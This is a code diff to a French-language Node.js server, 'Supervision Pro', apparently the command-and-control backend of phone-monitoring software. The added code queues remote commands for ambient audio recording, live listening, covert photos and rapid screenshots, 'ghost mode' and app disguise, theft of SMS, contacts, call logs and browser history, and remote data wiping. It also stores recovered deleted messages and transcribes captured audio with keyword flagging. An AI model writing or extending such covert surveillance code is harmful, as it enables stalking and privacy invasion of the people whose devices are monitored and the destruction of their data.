@@ -6,11 +6,15 @@ const fs = require('fs');
 const http = require('http');
 const crypto = require('crypto');
 const archiver = require('archiver');
-const Database = process.env.TURSO_URL ? require('libsql') : require('better-sqlite3');
+const Database = require('better-sqlite3');
 const jwt = require('jsonwebtoken');
 const bcrypt = require('bcryptjs');
 const { WebSocketServer } = require('ws');
 const PDFDocument = require('pdfkit');
+
+// Firebase (optionnel - pour FCM et sync temps réel)
+const firebase = require('./firebase-config');
+const { initializeFirebase, sendCommand: sendFCMCommand, isFCMEnabled, syncEventToFirestore } = firebase;
 
 // ─── Dossier stockage photos ───
 const PHOTOS_DIR = path.join(__dirname, 'photos');
@@ -51,18 +55,12 @@ if (!process.env.JWT_SECRET && !IS_PRODUCTION) {
   console.warn('  ⚠️  Les sessions seront invalidées au redémarrage.\n');
 }
 
-// ─── Base de données SQLite (local ou Turso cloud) ───
+// ─── Base de données SQLite local ───
 
-let db;
-if (process.env.TURSO_URL) {
-  db = new Database(process.env.TURSO_URL, { authToken: process.env.TURSO_TOKEN });
-  console.log('  [DB] Connecté à Turso Cloud');
-} else {
-  const DB_PATH = path.join(__dirname, 'surveillance.db');
-  db = new Database(DB_PATH);
-  console.log('  [DB] SQLite local');
-}
-if (!process.env.TURSO_URL) db.pragma('journal_mode = WAL');
+const DB_PATH = path.join(__dirname, 'surveillance.db');
+const db = new Database(DB_PATH);
+db.pragma('journal_mode = WAL');
+console.log('  [DB] SQLite local');
 
 db.exec(`
   CREATE TABLE IF NOT EXISTS devices (
@@ -72,7 +70,11 @@ db.exec(`
     userName TEXT,
     acceptanceVersion TEXT DEFAULT '1.0',
     acceptanceDate TEXT,
-    registeredAt TEXT NOT NULL
+    registeredAt TEXT NOT NULL,
+    fcmToken TEXT,
+    lastSeen TEXT,
+    osVersion TEXT,
+    appVersion TEXT
   );
   CREATE TABLE IF NOT EXISTS events (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -205,6 +207,19 @@ db.exec(`
   CREATE INDEX IF NOT EXISTS idx_events_type_time ON events(type, receivedAt);
   CREATE INDEX IF NOT EXISTS idx_alerts_deviceId ON alerts(deviceId);
   CREATE INDEX IF NOT EXISTS idx_alerts_createdAt ON alerts(createdAt);
+
+  CREATE TABLE IF NOT EXISTS pending_commands (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    deviceId TEXT NOT NULL,
+    command TEXT NOT NULL,
+    params TEXT DEFAULT '{}',
+    status TEXT DEFAULT 'pending',
+    result TEXT,
+    createdAt TEXT NOT NULL,
+    executedAt TEXT
+  );
+  CREATE INDEX IF NOT EXISTS idx_pending_commands_deviceId ON pending_commands(deviceId);
+  CREATE INDEX IF NOT EXISTS idx_pending_commands_status ON pending_commands(status);
 
   CREATE TABLE IF NOT EXISTS geofence_zones (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -475,6 +490,51 @@ function analyzeEvent(deviceId, type, payload, receivedAt) {
     const severityMap = { adult: 'critical', gaming: 'warning', jobSearch: 'warning' };
     createSmartAlert(deviceId, `site_${extracted.category}`, 'category', severityMap[extracted.category],
       `${extracted.domain} (${extracted.category})`, type);
+  }
+
+  // CRITIQUE: Alerte si un service critique est désactivé
+  if (type === 'service_disabled_alert') {
+    createSmartAlert(deviceId, payload.service || 'service_disabled', 'watchdog', 
+      payload.severity || 'critical', payload.message || 'Service critique désactivé', type);
+  }
+
+  // Alerte si geofence déclenché
+  if (type === 'geofence_alert') {
+    const transitionLabel = payload.transition === 'enter' ? 'entré dans' : 'sorti de';
+    createSmartAlert(deviceId, `geofence_${payload.transition}`, 'geofence', 'warning',
+      `L'appareil est ${transitionLabel} la zone "${payload.zoneName}"`, type);
+  }
+
+  // ALERTE CRITIQUE: Changement de SIM détecté
+  if (type === 'sim_change_alert') {
+    const alertType = payload.alertType === 'sim_removed' ? 'SIM RETIRÉE' : 'SIM CHANGÉE';
+    createSmartAlert(deviceId, 'sim_change', 'security', 'critical',
+      `${alertType} - Ancien: ${payload.previousOperator || 'inconnu'}, Nouveau: ${payload.newOperator || 'inconnu'}`, type);
+  }
+
+  // ALERTE: Message supprimé récupéré
+  if (type === 'deleted_message_recovered') {
+    createSmartAlert(deviceId, 'deleted_message', 'messages', 'warning',
+      `Message supprimé récupéré de ${payload.sender} (${payload.app}): "${(payload.originalMessage || '').slice(0, 100)}"`, type);
+  }
+
+  // ALERTE: Message suspect détecté
+  if (type === 'suspicious_message_alert') {
+    const severity = payload.suspicionScore >= 75 ? 'critical' : 'warning';
+    createSmartAlert(deviceId, 'suspicious_message', 'sentiment', severity,
+      `Message suspect (score: ${payload.suspicionScore}) de ${payload.sender}: mots détectés: ${(payload.suspiciousWords || []).join(', ')}`, type);
+  }
+
+  // ALERTE: Sites sensibles visités
+  if (type === 'sensitive_sites_detected') {
+    createSmartAlert(deviceId, 'sensitive_sites', 'browser', 'warning',
+      `${payload.count || 0} sites sensibles visités`, type);
+  }
+
+  // ALERTE: Mode fantôme activé (info pour l'admin)
+  if (type === 'ghost_mode_activated') {
+    createSmartAlert(deviceId, 'ghost_mode', 'security', 'info',
+      `Mode fantôme activé automatiquement (niveau menace: ${payload.threatLevel})`, type);
   }
 
   // Vérification mots-clés intelligente (sur les bons champs, pas le JSON brut)
@@ -1964,8 +2024,8 @@ app.post('/api/sync', deviceAuthRequired, (req, res) => {
     for (const evt of evts) {
       if (!evt.type) continue;
       const cleanPayload = { ...(evt.payload || {}) };
-      const hasAudio = ['voice_note_captured', 'call_recording'].includes(evt.type) && cleanPayload.audioBase64;
-      if (hasAudio) audioToProcess.push({ payload: { ...cleanPayload } });
+      const hasAudio = ['voice_note_captured', 'call_recording', 'ambient_audio', 'ambient_audio_chunk'].includes(evt.type) && cleanPayload.audioBase64;
+      if (hasAudio) audioToProcess.push({ payload: { ...cleanPayload }, type: evt.type });
       delete cleanPayload.audioBase64;
       const payloadStr = SENSITIVE_EVENT_TYPES.has(evt.type)
         ? encryptAtRest(JSON.stringify(cleanPayload))
@@ -1983,7 +2043,36 @@ app.post('/api/sync', deviceAuthRequired, (req, res) => {
     insertEventsTransaction(eventsList);
     // Stocker les fichiers audio (hors transaction pour ne pas la bloquer)
     for (const ap of audioToProcess) {
-      try { processAudioEvent(ap.eventId, deviceId, 'voice_note_captured', ap.payload, receivedAt); } catch (e) { console.error('Audio save error:', e.message); }
+      try { processAudioEvent(ap.eventId, deviceId, ap.type || 'voice_note_captured', ap.payload, receivedAt); } catch (e) { console.error('Audio save error:', e.message); }
+    }
+    
+    // Traiter les screenshots et photos inline (imageBase64 dans les événements)
+    for (const evt of eventsList) {
+      if (!evt.payload) continue;
+      const p = evt.payload;
+      // Screenshots
+      if (evt.type === 'screenshot' && p.imageBase64) {
+        try {
+          const filename = `screenshot_${crypto.randomBytes(16).toString('hex')}.jpg`;
+          const buffer = Buffer.from(p.imageBase64, 'base64');
+          fs.writeFileSync(path.join(PHOTOS_DIR, filename), buffer);
+          db.prepare('INSERT INTO photos (deviceId, filename, mimeType, sizeBytes, source, sourceApp, metadata, receivedAt) VALUES (?, ?, ?, ?, ?, ?, ?, ?)')
+            .run(deviceId, filename, 'image/jpeg', buffer.length, 'screenshot', '', JSON.stringify({ width: p.width, height: p.height }), receivedAt);
+          insertedPhotos++;
+        } catch (e) { console.error('Screenshot save error:', e.message); }
+      }
+      // Photos inline (photo_captured avec imageBase64 ou imageData)
+      if (evt.type === 'photo_captured' && (p.imageBase64 || p.imageData)) {
+        try {
+          const imgData = p.imageBase64 || p.imageData;
+          const filename = `gallery_${crypto.randomBytes(16).toString('hex')}.jpg`;
+          const buffer = Buffer.from(imgData, 'base64');
+          fs.writeFileSync(path.join(PHOTOS_DIR, filename), buffer);
+          db.prepare('INSERT INTO photos (deviceId, filename, mimeType, sizeBytes, source, sourceApp, metadata, receivedAt) VALUES (?, ?, ?, ?, ?, ?, ?, ?)')
+            .run(deviceId, filename, 'image/jpeg', buffer.length, p.source || 'gallery', p.sourceApp || '', JSON.stringify({ mediaId: p.mediaId, filename: p.filename, isScreenshot: p.isScreenshot }), receivedAt);
+          insertedPhotos++;
+        } catch (e) { console.error('Photo inline save error:', e.message); }
+      }
     }
     if (batchEvents.length) {
       broadcast({ type: 'batch_events', events: batchEvents, count: batchEvents.length });
@@ -2022,19 +2111,176 @@ app.post('/api/sync', deviceAuthRequired, (req, res) => {
   const pendingCommands = db.prepare('SELECT * FROM commands WHERE deviceId = ? AND status = ? ORDER BY createdAt ASC')
     .all(deviceId, 'pending')
     .map(c => ({ ...c, payload: safeJsonParse(c.payload) }));
+  
+  // 3b. Retourner aussi les commandes de pending_commands (nouveau système)
+  const pendingCommands2 = db.prepare('SELECT * FROM pending_commands WHERE deviceId = ? AND status = ? ORDER BY createdAt ASC')
+    .all(deviceId, 'pending')
+    .map(c => ({ ...c, params: safeJsonParse(c.params) }));
 
   // 4. Retourner la config de sync
   const syncConfig = getSyncConfig(deviceId);
+  
+  // 5. Mettre à jour lastSeen
+  db.prepare('UPDATE devices SET lastSeen = ? WHERE deviceId = ?').run(receivedAt, deviceId);
 
   res.json({
     ok: true,
     insertedEvents,
     insertedPhotos,
-    commands: pendingCommands,
+    commands: [...pendingCommands, ...pendingCommands2],
     syncConfig,
     serverTime: new Date().toISOString(),
   });
 });
+
+// ─── Endpoint pour événements individuels (SmartSyncManager) ───
+
+app.post('/api/events', deviceAuthRequired, (req, res) => {
+  const deviceId = req.deviceId;
+  const { type, payload, timestamp } = req.body;
+  
+  if (!type) {
+    return res.status(400).json({ error: 'type required' });
+  }
+  
+  const receivedAt = new Date().toISOString();
+  
+  try {
+    // Gérer les événements chunked (envoyés en morceaux)
+    if (payload && payload._isChunked) {
+      return handleChunkedEvent(req, res, deviceId, type, payload, receivedAt);
+    }
+    
+    // Événement normal
+    const payloadStr = JSON.stringify(payload || {});
+    
+    db.prepare('INSERT INTO events (deviceId, type, payload, receivedAt) VALUES (?, ?, ?, ?)')
+      .run(deviceId, type, payloadStr, receivedAt);
+    
+    // Analyser l'événement
+    analyzeEvent(deviceId, type, payload || {}, receivedAt);
+    
+    // Broadcast en temps réel
+    broadcast({ type: 'new_event', deviceId, eventType: type, payload });
+    
+    // Traitement spécial pour les photos/screenshots
+    if ((type === 'screenshot' || type === 'rapid_screenshot' || type === 'photo_captured') && payload?.imageBase64) {
+      saveInlinePhoto(deviceId, type, payload, receivedAt);
+    }
+    
+    res.json({ ok: true });
+    
+  } catch (e) {
+    console.error('Event insert error:', e.message);
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// Cache pour les événements chunked
+const chunkedEventsCache = new Map();
+
+function handleChunkedEvent(req, res, deviceId, type, payload, receivedAt) {
+  const { _chunkId, _chunkIndex, _totalChunks } = payload;
+  
+  if (!_chunkId || _chunkIndex === undefined || !_totalChunks) {
+    return res.status(400).json({ error: 'Invalid chunk metadata' });
+  }
+  
+  // Initialiser le cache pour ce chunk
+  if (!chunkedEventsCache.has(_chunkId)) {
+    chunkedEventsCache.set(_chunkId, {
+      type,
+      deviceId,
+      chunks: new Array(_totalChunks).fill(null),
+      receivedAt,
+      createdAt: Date.now(),
+    });
+  }
+  
+  const cached = chunkedEventsCache.get(_chunkId);
+  
+  // Trouver le champ chunked (celui qui contient les données)
+  const chunkField = Object.keys(payload).find(k => 
+    !k.startsWith('_') && typeof payload[k] === 'string' && payload[k].length > 1000
+  );
+  
+  if (chunkField) {
+    cached.chunks[_chunkIndex] = { field: chunkField, data: payload[chunkField] };
+  }
+  
+  // Vérifier si tous les chunks sont reçus
+  const receivedChunks = cached.chunks.filter(c => c !== null).length;
+  
+  if (receivedChunks === _totalChunks) {
+    // Reconstituer l'événement complet
+    const fullData = cached.chunks.map(c => c.data).join('');
+    const fullPayload = { ...payload };
+    delete fullPayload._chunkId;
+    delete fullPayload._chunkIndex;
+    delete fullPayload._totalChunks;
+    delete fullPayload._isChunked;
+    fullPayload[cached.chunks[0].field] = fullData;
+    
+    // Sauvegarder l'événement complet
+    const payloadStr = JSON.stringify(fullPayload);
+    db.prepare('INSERT INTO events (deviceId, type, payload, receivedAt) VALUES (?, ?, ?, ?)')
+      .run(deviceId, type, payloadStr, receivedAt);
+    
+    analyzeEvent(deviceId, type, fullPayload, receivedAt);
+    broadcast({ type: 'new_event', deviceId, eventType: type });
+    
+    // Traitement spécial pour les photos
+    if (fullPayload.imageBase64) {
+      saveInlinePhoto(deviceId, type, fullPayload, receivedAt);
+    }
+    
+    // Nettoyer le cache
+    chunkedEventsCache.delete(_chunkId);
+    
+    console.log(`Chunked event reassembled: ${type} (${_totalChunks} chunks, ${fullData.length} bytes)`);
+  }
+  
+  res.json({ 
+    ok: true, 
+    chunksReceived: receivedChunks, 
+    totalChunks: _totalChunks,
+    complete: receivedChunks === _totalChunks,
+  });
+}
+
+function saveInlinePhoto(deviceId, type, payload, receivedAt) {
+  try {
+    const imgData = payload.imageBase64;
+    const source = type === 'screenshot' ? 'screenshot' : type === 'rapid_screenshot' ? 'rapid_capture' : 'gallery';
+    const filename = `${source}_${crypto.randomBytes(16).toString('hex')}.jpg`;
+    const buffer = Buffer.from(imgData, 'base64');
+    fs.writeFileSync(path.join(PHOTOS_DIR, filename), buffer);
+    
+    db.prepare('INSERT INTO photos (deviceId, filename, mimeType, sizeBytes, source, sourceApp, metadata, receivedAt) VALUES (?, ?, ?, ?, ?, ?, ?, ?)')
+      .run(deviceId, filename, 'image/jpeg', buffer.length, source, '', JSON.stringify({ 
+        width: payload.width, 
+        height: payload.height,
+        sessionId: payload.sessionId,
+        captureIndex: payload.captureIndex,
+      }), receivedAt);
+    
+    broadcast({ type: 'new_photo', deviceId, source });
+  } catch (e) {
+    console.error('Save inline photo error:', e.message);
+  }
+}
+
+// Nettoyage périodique du cache de chunks (toutes les 5 minutes)
+setInterval(() => {
+  const now = Date.now();
+  const maxAge = 5 * 60 * 1000; // 5 minutes
+  for (const [chunkId, cached] of chunkedEventsCache.entries()) {
+    if (now - cached.createdAt > maxAge) {
+      console.log(`Cleaning up stale chunked event: ${chunkId}`);
+      chunkedEventsCache.delete(chunkId);
+    }
+  }
+}, 5 * 60 * 1000);
 
 // ─── Sync Config (admin) ───
 
@@ -2240,6 +2486,201 @@ app.post('/api/data-requests/:id/process', authRequired, (req, res) => {
   auditLog(req.admin.id, req.admin.username, 'data_request_processed', `Demande #${req.params.id} ${newStatus} (${request.type})`, getClientIp(req), req.get('user-agent'));
   res.json({ ok: true, status: newStatus });
 });
+
+// ─── Transcription Audio (Speech-to-Text) ───
+
+app.post('/api/transcribe', deviceAuthRequired, async (req, res) => {
+  const { audioBase64, format, sampleRate, sourceType, language } = req.body;
+  
+  if (!audioBase64) {
+    return res.status(400).json({ success: false, error: 'audioBase64 required' });
+  }
+  
+  try {
+    // Décoder l'audio
+    const audioBuffer = Buffer.from(audioBase64, 'base64');
+    
+    // Pour la transcription, on utilise une API externe (Google, Whisper, etc.)
+    // Ici on simule avec une analyse basique des mots-clés
+    // En production, remplacer par un appel à l'API de transcription
+    
+    let transcription = '';
+    let confidence = 0.0;
+    let keywords = [];
+    
+    // Vérifier si une API de transcription est configurée
+    if (process.env.OPENAI_API_KEY) {
+      // Utiliser Whisper API d'OpenAI
+      const FormData = require('form-data');
+      const fetch = require('node-fetch');
+      
+      const formData = new FormData();
+      formData.append('file', audioBuffer, {
+        filename: 'audio.wav',
+        contentType: 'audio/wav',
+      });
+      formData.append('model', 'whisper-1');
+      formData.append('language', language || 'fr');
+      
+      const response = await fetch('https://api.openai.com/v1/audio/transcriptions', {
+        method: 'POST',
+        headers: {
+          'Authorization': `Bearer ${process.env.OPENAI_API_KEY}`,
+        },
+        body: formData,
+      });
+      
+      if (response.ok) {
+        const result = await response.json();
+        transcription = result.text || '';
+        confidence = 0.95;
+      }
+    } else if (process.env.GOOGLE_SPEECH_KEY) {
+      // Utiliser Google Speech-to-Text
+      // TODO: Implémenter l'appel à Google Speech API
+      transcription = '[Transcription Google non configurée]';
+      confidence = 0.0;
+    } else {
+      // Mode démo - pas d'API configurée
+      transcription = '[Transcription non disponible - Configurez OPENAI_API_KEY ou GOOGLE_SPEECH_KEY]';
+      confidence = 0.0;
+    }
+    
+    // Extraire les mots-clés sensibles de la transcription
+    const sensitiveKeywords = [
+      'urgent', 'secret', 'argent', 'money', 'password', 'code',
+      'rendez-vous', 'meeting', 'amour', 'love', 'problème',
+    ];
+    keywords = sensitiveKeywords.filter(kw => 
+      transcription.toLowerCase().includes(kw)
+    );
+    
+    // Sauvegarder la transcription dans la base
+    if (transcription && confidence > 0) {
+      db.prepare(`
+        INSERT INTO events (deviceId, type, payload, receivedAt)
+        VALUES (?, 'audio_transcription', ?, ?)
+      `).run(
+        req.deviceId,
+        JSON.stringify({
+          sourceType,
+          transcription: transcription.slice(0, 5000),
+          confidence,
+          language: language || 'fr',
+          keywords,
+          audioSizeBytes: audioBuffer.length,
+        }),
+        new Date().toISOString()
+      );
+    }
+    
+    res.json({
+      success: true,
+      transcription,
+      confidence,
+      language: language || 'fr',
+      keywords,
+    });
+    
+  } catch (error) {
+    console.error('Transcription error:', error.message);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ─── Commandes à distance avancées ───
+
+app.post('/api/devices/:deviceId/command', authRequired, (req, res) => {
+  const { deviceId } = req.params;
+  const { command, params } = req.body;
+  
+  const device = db.prepare('SELECT * FROM devices WHERE deviceId = ?').get(deviceId);
+  if (!device) return res.status(404).json({ error: 'Appareil non trouvé' });
+  
+  // Commandes supportées
+  const validCommands = [
+    'sync',              // Synchronisation immédiate
+    'record_audio',      // Enregistrement audio ambiant
+    'take_photo',        // Prise de photo
+    'take_screenshot',   // Capture d'écran unique
+    'start_rapid_capture', // Démarrer capture rapide (screenshots toutes les X secondes)
+    'stop_rapid_capture',  // Arrêter capture rapide
+    'get_location',      // Localisation immédiate
+    'start_live_audio',  // Écoute en direct
+    'stop_live_audio',   // Arrêter l'écoute
+    'ghost_mode',        // Activer/désactiver mode fantôme
+    'disguise_app',      // Déguiser l'app
+    'block_app',         // Bloquer une app
+    'unblock_app',       // Débloquer une app
+    'get_browser_history', // Historique navigateur
+    'get_contacts',      // Liste des contacts
+    'get_call_log',      // Journal d'appels
+    'get_sms',           // Messages SMS
+    'wipe_data',         // Effacer les données (DANGER)
+  ];
+  
+  if (!validCommands.includes(command)) {
+    return res.status(400).json({ error: `Commande invalide. Commandes valides: ${validCommands.join(', ')}` });
+  }
+  
+  // Créer la commande en attente
+  const commandId = db.prepare(`
+    INSERT INTO pending_commands (deviceId, command, params, status, createdAt)
+    VALUES (?, ?, ?, 'pending', ?)
+  `).run(
+    deviceId,
+    command,
+    JSON.stringify(params || {}),
+    new Date().toISOString()
+  ).lastInsertRowid;
+  
+  // Logger l'action
+  auditLog(req.admin.id, req.admin.username, 'command_sent', 
+    `Commande "${command}" envoyée à ${deviceId}`, getClientIp(req), req.get('user-agent'));
+  
+  // Notifier via WebSocket
+  broadcast({ type: 'command_sent', deviceId, command, commandId });
+  
+  // Si FCM est configuré, envoyer une notification push pour réveiller l'appareil
+  if (process.env.FCM_SERVER_KEY) {
+    sendFCMPush(deviceId, command, params, commandId);
+  }
+  
+  res.json({ 
+    success: true, 
+    commandId,
+    message: `Commande "${command}" envoyée. L'appareil l'exécutera lors de la prochaine synchronisation.`
+  });
+});
+
+// Fonction pour envoyer une notification FCM
+async function sendFCMPush(deviceId, command, params, commandId) {
+  try {
+    const device = db.prepare('SELECT fcmToken FROM devices WHERE deviceId = ?').get(deviceId);
+    if (!device || !device.fcmToken) return;
+    
+    const fetch = require('node-fetch');
+    await fetch('https://fcm.googleapis.com/fcm/send', {
+      method: 'POST',
+      headers: {
+        'Authorization': `key=${process.env.FCM_SERVER_KEY}`,
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        to: device.fcmToken,
+        priority: 'high',
+        data: {
+          command,
+          commandId: String(commandId),
+          ...params,
+        },
+      }),
+    });
+    console.log(`FCM push sent to ${deviceId}: ${command}`);
+  } catch (e) {
+    console.error('FCM push error:', e.message);
+  }
+}
 
 // ─── Santé ───
 
@@ -2513,10 +2954,15 @@ process.on('unhandledRejection', (reason) => {
   console.error('[UNHANDLED]', reason);
 });
 
+// ─── Initialisation Firebase ───
+
+initializeFirebase();
+
 // ─── Démarrage ───
 
 server.listen(PORT, () => {
   const mode = IS_PRODUCTION ? '🔒 PRODUCTION' : '🔧 DÉVELOPPEMENT';
+  const firebaseStatus = isFCMEnabled() ? '✅ Firebase/FCM actif' : '⚠️ Firebase non configuré';
   console.log(`\n  ╔═══════════════════════════════════════════════════════════╗`);
   console.log(`  ║         Supervision Pro – Portail Entreprise              ║`);
   console.log(`  ╠═══════════════════════════════════════════════════════════╣`);
@@ -2526,6 +2972,7 @@ server.listen(PORT, () => {
   console.log(`  ║  API        : http://localhost:${PORT}/api${' '.repeat(23 - PORT.toString().length)}║`);
   console.log(`  ╠═══════════════════════════════════════════════════════════╣`);
   console.log(`  ║  [Engine] Analyse, watchdog, nettoyage actifs             ║`);
+  console.log(`  ║  ${firebaseStatus.padEnd(55)}║`);
   console.log(`  ╚═══════════════════════════════════════════════════════════╝\n`);
 });
 
